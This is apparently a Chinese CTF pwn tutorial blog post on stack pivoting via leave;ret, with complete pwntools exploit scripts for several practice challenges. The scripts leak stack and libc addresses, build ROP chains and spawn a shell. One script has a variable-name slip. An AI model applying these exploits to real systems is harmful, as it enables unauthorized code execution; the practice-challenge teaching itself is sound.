                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">栈迁移专题学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="栈迁移专题学习"><a href="#栈迁移专题学习" class="headerlink" title="栈迁移专题学习"></a>栈迁移专题学习</h2><p>📚 看了好几篇栈迁移的文章，🤔 越看越懵，😵‍💫 感觉自己和没学 pwn 的一样。</p>
<ul>
<li><a href="#%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0">原理学习</a><ul>
<li><a href="#32%E4%BD%8D">32位</a></li>
<li><a href="#64%E4%BD%8D">64位</a></li>
</ul>
</li>
<li><a href="#%E5%AE%9E%E4%BE%8B">实例</a><ul>
<li><a href="#32%E4%BD%8D">32位</a></li>
<li><a href="#64%E4%BD%8D">64位</a></li>
</ul>
</li>
</ul>
<h3 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><ol>
<li>首先先了解栈的结构</li>
</ol>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="1"></p>
<p>(自己画的，有错误望指正)</p>
<ol start="2">
<li>了解栈的结构后，我们再来仔细了解一下leave;ret这两个指令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call func()</span><br><span class="line">-----------</span><br><span class="line">push eip + 4</span><br><span class="line">push ebp </span><br><span class="line">mov  ebp,esp</span><br></pre></td></tr></table></figure>

<p>   如果要保持栈平衡就要在call退出的时候执行相反的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">----------</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">************</span><br><span class="line">ret</span><br><span class="line">------------</span><br><span class="line">pop eip</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>什么时候用栈迁移：</p>
<p>(1).有栈溢出漏洞。</p>
<p>(2).溢出的长度不够。</p>
<p>所以我们就要把栈迁移到一个长度够大的区域(通常是bss段)，那怎么把栈迁移呢，主要就是控制栈顶的esp指针指向我们想要他到达的地方(迁移后的地址)，从而控制程序的执行流。</p>
</li>
<li><p>栈迁移最重要就是怎么利用leave；ret进行栈迁移</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave //mov esp;ebp 把ebp传给esp,此时esp和ebp就在同一个位置了，他们指向同一个内容</span><br><span class="line">      //pop ebp 把栈顶的内容弹给ebp。此时ebp指向的就是栈顶的内容了</span><br><span class="line">由于esp时刻指向的是栈顶的位置，栈顶的内容弹出后，esp会下降一个单位</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBleave.png" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret  //pop eip 就是把esp指向地址弹如eip,同时esp下降一个单元</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBret.png" alt="3"></p>
<p>了解了栈的结构和leave;ret的执行过程后，就可以来了解栈迁移的原理了</p>
<ol start="5">
<li><p>栈迁移的原理：栈迁移一共要执行两次leave;ret</p>
<p>1.首先我们先了解一下此时栈上的分布情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主要如下图，这里注释：</span><br><span class="line">0xffff100c---&gt;system的返回地址</span><br><span class="line">0xffff1010---&gt;system参数的存储地址</span><br><span class="line">0xffff1014---&gt;存储/bin</span><br><span class="line">0xffff1018---&gt;存储/sh</span><br><span class="line">0xffff1020---&gt;0xffff1004  也就是ebp---&gt;0xffff1004</span><br><span class="line">0xffff1024---&gt;leave ret;  原本是return address;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/system%E5%88%86%E5%B8%83.png" alt="4"></p>
<p>2.第一次leave;ret:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由上面的leave;ret的执行过程，首先leave：mov ebp;esp,让ebp和esp在同一个位置；leave: pop ebp,此时我们把ebp所指的内容换成</span><br><span class="line">了需要迁移到的位置，所以pop ebp后esp指向的就是需要迁移到的位置。然后我们把return address换成leave ret的地址，就会再次执</span><br><span class="line">行leave ret。</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave1.png" alt="5"></p>
<p>3.第二次leave;ret:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同样是leave:mov ebp;esp,让ebp和esp在同一个位置；但是此时ebp指向的是需要迁移到的位置，所以esp此时指向的也是需要迁移到的位</span><br><span class="line">置;leave：pop ebp,我们把return address的地址换成system的地址,就使得esp下降一个单元后正好指向system的地址。ret:pop </span><br><span class="line">eip,最终eip指向system的地址---&gt;getshell</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave2.png" alt="5"></p>
</li>
</ol>
<p>了解完了32位的栈溢出，现在来了解64位栈溢出</p>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>64位和32位栈的结构是相似的，主要不同就是调用函数时传参的不同</p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/64&&32%E4%BC%A0%E5%8F%82.png" alt="5"></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2">buuctf-ciscn_2019_es_2</a></p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.2.png" alt="6"></p>
<ol>
<li>IDA反编译</li>
</ol>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.0.png" alt="6"></p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.1.png" alt="6"></p>
<p>计算一下溢出的长度0x30 - 0x28 &#x3D; 8;很明显长度不够，要用到栈迁移。</p>
<ol start="2">
<li>先给出exp，在具体解释</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29440</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x8048400</span></span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, my friend. What&#x27;</span>s your name?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>bbb<span class="string">b&#x27;)</span></span><br><span class="line"><span class="string">ebp=u32(p.recv(4).ljust(4,b&#x27;</span>\x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">buf=ebp-0x38 </span></span><br><span class="line"><span class="string">payload=(p32(sys_addr)+b&#x27;</span>aaaa<span class="string">&#x27;+p32(buf+12)+b&#x27;</span>/<span class="built_in">bin</span>/sh\x00<span class="string">&#x27;).ljust(0x28,b&#x27;</span>a<span class="string">&#x27;)+p32(buf-4)+p32(leave)</span></span><br><span class="line"><span class="string">r.send(payload) </span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>首先找到leave ret的地址可以用ROPgadget找，也可以直接在IDA的汇编代码里面找</li>
</ol>
<p>(1)用ROPgadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_es_2 --only &quot;leave|ret&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.4.png" alt="8"></p>
<p>(2)在IDA的汇编代码里面找</p>
<p>​       <img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.5.png" alt="8"></p>
<ol start="4">
<li>找到system的plt地址</li>
</ol>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.6.png" alt="8"></p>
<ol start="5">
<li><p>在vul函数中有两个溢出点，所以我们就需要先通过第一个溢出泄露出ebp的地址，再构造栈迁移的payload</p>
<p>(1)首先泄露ebp的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node5.buuoj.cn&quot;, 25271)</span></span><br><span class="line">payload1= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> </span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>(2)构造栈迁移的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf=ebp-0x38 </span><br><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf-4)+p32(leave)</span><br></pre></td></tr></table></figure>

<p>buf&#x3D;ebp-0x38 通过调试可以得到，我们最后调试，先解释payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf)+p32(leave)</span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line">buf + 12:p32(sys_addr)=4,b&#x27;aaaa&#x27;=4,p32(buf+12)=4,4+4+4=12所以buf+12就是/bin/sh的起始地址</span><br><span class="line">p32(buf)：栈迁移所到达的位置</span><br><span class="line">leave:leave ret;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.7.png" alt="8"></p>
</li>
</ol>
<p>​       0xfffd158 - 0xfffd130 &#x3D; 0x28   0xfffd158回弹到0xfffd168，正好0x28 + 0x10 &#x3D; 0x38;</p>
<h4 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#actf_2019_babystack">actf_2019_babystack</a></p>
<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.0.png" alt="9"></p>
<p> 64位，只开了NX,先给出exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#io =process(&#x27;./ACTF_2019_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26651</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4008F6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400ad3</span></span><br><span class="line">pop_rsi__r15_ret =<span class="number">0x400ad1</span></span><br><span class="line">leave_ret = <span class="number">0x400A18</span></span><br><span class="line">offest = <span class="number">0xd0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">system_addr = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(leave_ret+<span class="number">1</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.1.png" alt="9"></p>
<p>这个很明显要栈迁移了</p>
<p>这个附件里面没有找到system的地址，所以我们只能通过泄露libc来打了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr) #ret2libc的payload</span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;) #填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #stack_addr就是栈的起始位置，也就是我要迁移到的位置，本题直接回打印出来，接受就可以了</span><br><span class="line">b&#x27;a&#x27;*8是因为pop rbp的时候 rsp会+8，所以要。</span><br></pre></td></tr></table></figure>

<p>发送payload后，就会泄露libc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(leave_ret+1)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">#system(/bin/sh)  leave_ret+1---&gt;retn用于堆栈平衡 </span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;)#填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #同理最终栈迁移执行shell</span><br></pre></td></tr></table></figure>



<h2 id="栈迁移到这里基本就总结结束啦～🌈✨😊"><a href="#栈迁移到这里基本就总结结束啦～🌈✨😊" class="headerlink" title="栈迁移到这里基本就总结结束啦～🌈✨😊"></a>栈迁移到这里基本就总结结束啦～🌈✨😊</h2><p>这里记录一个难的栈迁移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you the king of stack migrate?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x90u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x90 - 0x80 &#x3D; 0x10典型的栈迁移,先给exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">30481</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x4011c8</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x40119e</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Are you the king of stack migrate?\n&#x27;</span>, pay_pivot)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x401146</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>],     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x40112d</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x40119e</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造最终payload执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    pop_rdi := <span class="number">0x401146</span>,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr</span><br><span class="line">).ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>) + p64(<span class="number">0x4011c8</span>)  <span class="comment"># leave_ret</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里只有一个read函数，所以我们迁到栈上几乎是不可能的了，所以我们就想到迁到bss的段上</span><br></pre></td></tr></table></figure>

<p>这里把payload怎么构造和解题思路详细写一下。</p>
<p>解题思路</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先将栈迁到bss的段上，返回地址覆盖为read函数，再次读入时泄露puts的地址，返回地址依然为read,再次读入getshell。</span><br></pre></td></tr></table></figure>

<p>详细解释一下这个payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x40119e</span>)</span><br></pre></td></tr></table></figure>

<p>read_addr &#x3D; 0x40119e,rbp –&gt;p64(bss + offset),返回地址覆盖为read_addr(raed_addr后面有leave_ret)所以完成了，将栈迁移到bss + offset的位置进行读入。</p>
